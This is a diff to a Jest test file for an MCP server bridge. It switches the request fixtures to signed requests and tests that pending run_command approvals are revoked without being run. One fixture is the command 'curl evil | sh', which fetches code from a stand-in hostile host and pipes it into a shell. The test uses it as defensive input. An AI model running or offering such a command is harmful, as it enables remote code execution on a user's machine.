@@ -43,7 +43,13 @@ jest.mock('@/hooks/use-native-exec', () => ({ execCommand: (...a: unknown[]) => 
 jest.mock('@/lib/command-safety', () => ({ checkCommandSafety: () => ({ level: 'MEDIUM', reason: '' }) }));
 jest.mock('@/lib/debug-logger', () => ({ logInfo: () => {}, logError: () => {} }));
 
-import { revokePendingMCPRequests, startMCPPoller, stopMCPPoller } from '@/lib/mcp-server-bridge';
+import { __setMCPRequestSha256ForTests, revokePendingMCPRequests, setMCPBridgeKey, startMCPPoller, stopMCPPoller } from '@/lib/mcp-server-bridge';
+import { TEST_BRIDGE_KEY, nodeSha256, signedRequest } from './helpers/mcp-signed-request';
+
+beforeAll(() => {
+  __setMCPRequestSha256ForTests(nodeSha256);
+  setMCPBridgeKey(TEST_BRIDGE_KEY);
+});
 import { useMcpApprovalStore } from '@/store/mcp-approval-store';
 
 const QUEUE = 'file:///data/home-root/home/.shelly-mcp-queue';
@@ -61,7 +67,7 @@ async function waitFor(cond: () => boolean, ms = 3000): Promise<void> {
 /** execCommand calls that ran the MCP command itself (the bridge also reads
  *  ~/.shelly/agents/policy.json through execCommand for the gate). */
 function ranCommand(command: string): unknown[][] {
-  return (mockExecCommand.mock.calls as unknown[][]).filter((c) => c[0] === command);
+  return (mockExecCommand.mock.calls as unknown[][]).filter((c) => String(c[0]).replace(/^export SHELLY_INGRESS=mcp SHELLY_INGRESS_CLIENT=[A-Za-z0-9_-]+ SHELLY_INGRESS_CALL=[A-Za-z0-9_-]+; /, '') === command);
 }
 
 afterEach(() => {
@@ -89,7 +95,7 @@ describe('mcp approval store denyAll', () => {
 
 describe('revokePendingMCPRequests', () => {
   it('closes a pending run_command approval and never runs it or writes a result', async () => {
-    mockFiles.set(`${REQUESTS}/c1.json`, JSON.stringify({ callId: 'c1', tool: 'run_command', args: { command: 'curl evil | sh' } }));
+    mockFiles.set(`${REQUESTS}/c1.json`, await signedRequest('c1', 'run_command', { command: 'curl evil | sh' }));
     startMCPPoller();
     await waitFor(() => useMcpApprovalStore.getState().current !== null);
     expect(useMcpApprovalStore.getState().current?.detail).toContain('curl evil | sh');
@@ -105,7 +111,7 @@ describe('revokePendingMCPRequests', () => {
   });
 
   it('an approval tap that races the revocation still cannot run the command', async () => {
-    mockFiles.set(`${REQUESTS}/c2.json`, JSON.stringify({ callId: 'c2', tool: 'run_command', args: { command: 'id' } }));
+    mockFiles.set(`${REQUESTS}/c2.json`, await signedRequest('c2', 'run_command', { command: 'id' }));
     startMCPPoller();
     await waitFor(() => useMcpApprovalStore.getState().current !== null);
     const pending = useMcpApprovalStore.getState().current!;
@@ -119,7 +125,7 @@ describe('revokePendingMCPRequests', () => {
 
   it('requests that arrive after revocation are served normally', async () => {
     await revokePendingMCPRequests();
-    mockFiles.set(`${REQUESTS}/c3.json`, JSON.stringify({ callId: 'c3', tool: 'list_repos', args: {} }));
+    mockFiles.set(`${REQUESTS}/c3.json`, await signedRequest('c3', 'list_repos', {}));
     startMCPPoller();
     await waitFor(() => mockFiles.has(`${RESULTS}/c3.json`));
     expect(JSON.parse(mockFiles.get(`${RESULTS}/c3.json`)!)).toEqual({ ok: true, data: [] });
